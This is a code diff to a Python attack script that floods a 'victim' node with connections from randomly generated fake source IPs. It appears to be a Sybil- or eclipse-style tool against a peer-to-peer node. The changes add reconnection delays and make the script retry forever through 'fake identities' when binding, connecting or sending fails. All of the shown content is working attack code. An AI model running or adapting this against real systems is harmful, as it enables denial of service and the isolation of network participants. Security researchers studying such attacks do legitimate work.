@@ -141,7 +141,7 @@ def ping_packet():
 
 # Close a connection
 def close_connection(socket, ip, port, interface):
-	successful = False
+	successful = True
 	try:
 		socket.close()
 	except: successful = False
@@ -190,8 +190,9 @@ def make_fake_connection(src_ip, dst_ip, verbose=True, attempt_number = 0):
 		s.bind((src_ip, src_port))
 	except:
 		print('Failed to bind ip to victim')
-		close_connection(s, src_ip, src_port, interface)
 		time.sleep(1)
+		close_connection(s, src_ip, src_port, interface)
+		time.sleep(3)
 		rand_ip = random_ip()
 		create_task(False, 'Creating fake identity: ' + rand_ip, make_fake_connection, rand_ip, dst_ip, False, attempt_number - 1)
 		return
@@ -201,8 +202,9 @@ def make_fake_connection(src_ip, dst_ip, verbose=True, attempt_number = 0):
 		s.connect((dst_ip, dst_port))
 	except:
 		print('Failed to connect to victim')
-		close_connection(s, src_ip, src_port, interface)
 		time.sleep(1)
+		close_connection(s, src_ip, src_port, interface)
+		time.sleep(3)
 		rand_ip = random_ip()
 		create_task(False, 'Creating fake identity: ' + rand_ip, make_fake_connection, rand_ip, dst_ip, False, attempt_number - 1)
 		return
@@ -225,8 +227,10 @@ def make_fake_connection(src_ip, dst_ip, verbose=True, attempt_number = 0):
 		s.sendall(ping_packet().to_bytes())
 	except:
 		print('Failed to send packets to victim')
+		time.sleep(1)
 		if temp_listener != None: temp_listener.stop()
 		close_connection(s, src_ip, src_port, interface)
+		time.sleep(3)
 		rand_ip = random_ip()
 		create_task(False, 'Creating fake identity: ' + rand_ip, make_fake_connection, rand_ip, dst_ip, False, attempt_number - 1)
 		return
@@ -591,7 +595,8 @@ if __name__ == '__main__':
 	# Create the connections
 	for i in range(1, num_identities + 1):
 		try:
-			make_fake_connection(src_ip = random_ip(), dst_ip = victim_ip, verbose = True, attempt_number = 5)
+			# With attempt_number == -1, it will retry to connect infinitely
+			make_fake_connection(src_ip = random_ip(), dst_ip = victim_ip, verbose = True, attempt_number = -1)
 		except ConnectionRefusedError:
 			print('Connection was refused. The victim\'s node must not be running.')
 
